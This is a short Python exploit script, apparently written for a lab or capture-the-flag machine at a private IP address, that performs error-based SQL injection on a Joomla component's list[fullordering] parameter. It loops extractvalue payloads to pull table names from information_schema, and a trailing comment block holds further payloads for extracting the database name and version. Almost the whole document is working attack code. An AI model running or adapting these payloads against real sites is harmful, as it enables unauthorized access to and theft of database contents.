#!/usr/bin/python3

import sys
import requests
import re
import urllib.request

#url = input("Enter url:")
url = "http://10.10.171.53/"
append_url_path = url + "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]="
original_stdout = sys.stdout

# Injecting malicious code to extract Tables from database
for x in range(0,100):
    payload="1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,concat(table_name),0x7e7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/{0},1)))=1".format(x)
    table_payload = append_url_path + payload
    send_request = requests.get(table_payload)
    match = re.search('~~~(.+?)\w+',send_request.text)
    test = print("Extracting Table Name: - " + match.group(0))
    with open('filename.txt', 'w') as f:
        sys.stdout = f # Change the standard output to the file we created.
        print(match.group(0))
        sys.stdout
"""
                Fetching database name logic
-----------------------------------------------------------
$dbname='1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(database(),1,20),0x7e7e7e))))=1';
        $final_url=$inject.$dbname;
        $data_extracted=data($final_url);
        $de0=explode("~~~", $data_extracted);
        $de1=explode("~~~", $de0[1]);
        $db_name=trim($de1[0]);
----------------------------------------------------------

                Extracting version logic
----------------------------------------------------------
$dbversion='1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(version(),1,20),0x7e7e7e))))=1';
        $final_url=$inject.$dbversion;
        $data_extracted=data($final_url);
        $de0=explode("~~~", $data_extracted);
        $de1=explode("~~~", $de0[1]);
        $db_version=trim($de1[0]);
---------------------------------------------------------
"""

